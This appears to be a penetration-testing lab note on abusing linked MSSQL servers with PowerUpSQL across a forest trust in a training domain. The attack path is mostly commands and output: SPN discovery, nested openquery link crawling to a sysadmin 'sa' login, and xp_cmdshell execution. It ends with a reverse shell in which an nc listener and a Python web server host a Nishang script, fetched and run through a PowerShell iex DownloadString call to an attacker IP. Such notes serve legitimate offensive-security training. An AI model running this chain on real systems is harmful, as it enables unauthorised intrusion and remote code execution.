#cross-forest-attack 

```powershell
# PowerUpSQL.psd1
Import-Module .\PowerUpSQL.psd1


```

# Enumerate MSSQL service
```powershell
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check Accessibility
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```


# Understanding Database Links
- A database link allows a SQL Server to access external data sources like
other SQL Servers and OLE DB data sources.
- In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
- Database links work even across forest trusts.

# Abusing database link and get a reverse shell
1. Enumerate SQL Servers in domain
```powershell
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#ComputerName : dcorp-mssql.dollarcorp.moneycorp.local 
#Instance : DCORP-MSSQL
#Currentlogin
```

2. Using Heidi SQL client connect to enumerate linked databases
```sql
# Heidi sql client > select MSSQL > Windows authentication
select * from master..sysservers
```
We see that there is a database link to dcorp-sql1
![[Pasted image 20211010211144.png]]

3. Enumerate further links from dcorp-sql1 using the openquery statement
```sql
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```
![[Pasted image 20211010211319.png]]

It is possible to nest openquery within another openquery which leads us to dcorp-mgmt
```sql
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```
![[Pasted image 20211010211411.png]]

Alternatively, we can use Get-SQLServerLinkCrawl 
For crawling the database links automatically
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose

#Version     : SQL Server 2017
#Instance    : DCORP-MSSQL
#CustomQuery :
#Sysadmin    : 0
#Path        : {DCORP-MSSQL}
#User        : dcorp\student133
#Links       : {DCORP-SQL1}

#Version     : SQL Server 2017
#Instance    : DCORP-SQL1
#CustomQuery :
#Sysadmin    : 0
#Path        : {DCORP-MSSQL, DCORP-SQL1}
#User        : dblinkuser
#Links       : {DCORP-MGMT}

#Version     : SQL Server 2017
#Instance    : DCORP-MGMT
#CustomQuery :
#Sysadmin    : 0
#Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
#User        : sqluser
#Links       : {EU-SQL.EU.EUROCORP.LOCAL}

#Version     : SQL Server 2017
#Instance    : EU-SQL
#CustomQuery :
#Sysadmin    : 1
#Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-#SQL.EU.EUROCORP.LOCAL}
#User        : sa
#Links       :

```

4. If xp_cmdshell is enabled (or RPC out is true) it is possible to execute commands using linked databases.
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"

#..
#CustomQuery : {nt authority\network service, }
#..
```

5. Reverse shell 
```powershell

# start webserver hosting nishang reverse shell
python -m SimpleHTTPServer 80

# nc.exe -nvlp 4444

# trigger payload
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.133/Callme.ps1'')"'

```